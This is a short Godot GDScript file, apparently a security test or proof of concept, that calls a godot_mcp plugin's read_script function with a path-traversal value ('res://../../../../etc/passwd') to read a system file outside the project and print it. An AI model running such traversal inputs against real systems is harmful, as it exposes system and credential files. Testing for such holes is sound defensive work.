extends SceneTree

func _init():
    var script_ops = load("res://godot_plugin/addons/godot_mcp/script_ops.gd").new()
    var result = script_ops.read_script("res://../../../../etc/passwd")
    print(result)
    quit()
